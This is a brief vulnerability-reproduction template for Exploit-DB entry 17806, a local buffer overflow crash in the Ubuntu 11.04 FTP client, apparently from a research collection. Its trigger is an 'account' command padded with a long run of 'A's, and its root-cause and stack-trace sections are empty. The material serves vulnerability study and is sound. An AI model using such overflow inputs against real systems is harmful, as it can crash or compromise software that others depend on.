# EDB-17806

## Experiment Environment

Ubuntu 11.04

## INSTALL & Configuration

Preinstalled environment

```
ii  ftp                                   0.17-23
The FTP client
```

## Problems in Installation & Configuration


## How to trigger vulnerability

```
ftp localhost
## login in with normal user
ftp> account AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

## PoCs

[FTP Client (Ubuntu 11.04) - Local Buffer Overflow Crash (PoC)](https://www.exploit-db.com/exploits/17806/)

## Vulnerability Details & Patch

### Root Cause

### Stack Trace

## References
